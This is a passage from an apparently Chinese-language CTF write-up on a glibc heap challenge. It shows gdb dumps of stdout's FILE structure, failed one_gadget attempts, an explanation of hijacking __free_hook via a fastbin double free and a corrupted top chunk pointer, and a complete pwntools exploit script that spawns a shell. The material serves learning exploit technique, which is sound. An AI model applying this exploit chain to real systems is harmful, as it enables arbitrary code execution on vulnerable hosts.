    {
      file = _IO_FILE
    {
        _flags = 0xfbad2887, 
        _IO_read_ptr = 0x7fb37b8cc6a3  "\n", 
        _IO_read_end = 0x7fb37b8cc6a3  "\n", 
        _IO_read_base = 0x7fb37b8cc6a3  "\n", 
        _IO_write_base = 0x7fb37b8cc6a3  "\n", 
        _IO_write_ptr = 0x7fb37b8cc6a3  "\n", 
        _IO_write_end = 0x7fb37b8cc6a3  "\n", 
        _IO_buf_base = 0x7fb37b8cc6a3  "\n", 
        _IO_buf_end = 0x7fb37b8cc6a4  "", 
        _IO_save_base = 0x0, 
        _IO_backup_base = 0x0, 
        _IO_save_end = 0x0, 
        _markers = 0x0, 
        _chain = 0x7fb37b8cb8e0 , 
        _fileno = 0x1, 
        _flags2 = 0x0, 
        _old_offset = 0xffffffffffffffff, 
        _cur_column = 0x0, 
        _vtable_offset = 0x0, 
        _shortbuf = "\n", 
        _lock = 0x7fb37b8cd780 , 
        _offset = 0xffffffffffffffff, 
        _codecvt = 0x0, 
        _wide_data = 0x7fb37b8cb7a0 , 
        _freeres_list = 0x0, 
        _freeres_buf = 0x0, 
        __pad5 = 0x0, 
        _mode = 0xffffffff, 
        _unused2 = '\000' 
      }, 
      vtable = 0x7fb37b8ca6e0 
    }
    gef➤  p *(const struct _IO_jump_t *)_IO_2_1_stdout_.vtable
    $8 = _IO_jump_t
    _IO_jump_t
    {
      __dummy = 0x0, 
      __dummy2 = 0x0, 
      __finish = 0x7fb37b5809c0 , 
      __overflow = 0x7fb37b581730 , 
      __underflow = 0x7fb37b5814a0 , 
      __uflow = 0x7fb37b582600 , 
      __pbackfail = 0x7fb37b583980 , 
      __xsputn = 0x7fb37b5801e0 , 
      __xsgetn = 0x7fb37b57fec0 , 
      __seekoff = 0x7fb37b57f4c0 , 
      __seekpos = 0x7fb37b582a00 , 
      __setbuf = 0x7fb37b57f430 , 
      __sync = 0x7fb37b57f370 , 
      __doallocate = 0x7fb37b574180 , 
      __read = 0x7fb37b5801a0 , 
      __write = 0x7fb37b57fb70 , 
      __seek = 0x7fb37b57f970 , 
      __close = 0x7fb37b57f340 , 
      __stat = 0x7fb37b57fb60 , 
      __showmanyc = 0x7fb37b583af0 , 
      __imbue = 0x7fb37b583b00 
    }
调试发现无法get shell，使用其他`one_gadget`也get shell失败，调试发现其均无法满足约束条件
    one_gadget /lib/x86_64-linux-gnu/libc.so.6 
    0x45216 execve("/bin/sh", rsp+0x30, environ)
    constraints:
      rax == NULL
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    0xf02a4 execve("/bin/sh", rsp+0x50, environ)
    constraints:
      [rsp+0x50] == NULL
    0xf1147 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
#### __free_hook
如何getshell，那只能想办法劫持到`system`地址，但函数需要参数`/bin/sh`。
那可以劫持`__free_hook`地址指向`system`，
再删除对应空间(`其值为/bin/sh\x00`)即可调用`system(/bin/sh)`从而get shell
劫持`__free_hook`的思路是，想办法修改`top
chunk`(`main_arena+88`)指向`__free_hook`上方某地址，然后多次分配内存，直到`__free_hook`地址附近，构造长度修改即可。
修改`top chunk`地址的方法是： 在`__malloc_hook`附近找到满足条件的chunk size，
在`__malloc_hook-0x3`找到一个位置；
写入时构造一个chunk header， size为0x70， 将0x70的fastbin数组位置（`main_arena+48`）指向这里
下一次分配即可分配到`main_arena+16`位置， 写入滑动到`main_arena+88`, 写入`__free_hook`上方某个满足`top
chunk size`条件的位置地址 ，这样`top chunk`就指向`__free_hook`上方某位置了
在`__free_hook`上方找一下，`__free_hook-0xb58`位置有一个符合条件的size，size足够大，满足`top chunk`条件
然后不断分配chunk，直到`__free_hook`附近。如分配0x90， 对应chunk size为0xa0, 那`0xb58/0xa0=18,
0xb58-0xa0*18=24`，
分配完18个0xa0大小的chunk后，再分配一个chunk，内容写入滑动`24-0x10=8`个字符即到达`__free_hook`位置，写入`system`即可
可看出`__free_hook`指向了`system`地址
    add(0x68,p64(libc.sym['__malloc_hook']-0x23+0x20))# in heap 3
    add(0x68,'/bin/sh\x00') # heap 4
    add(0x68,'5555') # heap 5
    add(0x68,chr(0x0)*(0x1b-8)+p64(0)+p64(0x70)*3+p64(libc.sym['__malloc_hook']+0x20))
    add(0x68,chr(0)*0x38+p64(libc.sym['__free_hook']-0xb58))
    for i in range(18):
        add(0x90,'aaa')
    add(0x90,'a'*8+p64(libc.sym['system']))
    delete(4) # heap 4 content:/bin/sh\x00
    p.interactive()
运行即可get shell
打远程也成功：
最终exp为:
    from pwn import *
    #context.log_level='debug'
    p=process('./heap')
    #p=remote('120.55.43.255', 12240) # raw ctf game addr
    libc=ELF('./heap').libc
    def add(size,data):
        p.sendlineafter('Choice :','1')
        p.sendlineafter('size: ',str(size))
        p.sendafter('data: ',data)
    def delete(index):
        p.sendlineafter('Choice :','2')
        p.sendlineafter('delete: ',str(index))
    def show():
        p.sendlineafter('Choice :','3')
    add(0x100,'0000')#0
    add(0x68,'1111')#1
    delete(0)
    add(0x100,'aaaaaaaa')#0
    show()
    libc_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\0'))
    success(hex(libc_addr))
    libc.address=libc_addr-0x3c4b20-88
    success('libc addr:'+hex(libc.address))
    add(0x68,'2222')#2
    add(0x68,'3333')#3
    add(0x68,'4444')#4
    delete(1)
    add(0x68,'1'*0x68+'\xe1') #1, overchapping ,chunk 2 size
    delete(2) # free 2 and 3
    add(0x68,'2222')#2, heap 2
    add(0x68,'5555')#5, heap 3
    delete(5) # free chunk 3
    delete(4) 
    delete(3) #double free  chunk 3
    #3->4->3
    add(0x68,p64(libc.sym['__malloc_hook']-0x23+0x20))# heap 3
    add(0x68,'/bin/sh\x00') # heap 4
    add(0x68,'cccc') # heap 5
    add(0x68,chr(0x0)*(0x1b-8)+p64(0)+p64(0x70)*3+p64(libc.sym['__malloc_hook']+0x20))
    add(0x68,chr(0)*0x38+p64(libc.sym['__free_hook']-0xb58))
    for i in range(18):
        add(0x90,'aaa')
    add(0x90,'a'*8+p64(libc.sym['system']))
    delete(4)
    p.interactive()
* * *
样本见附件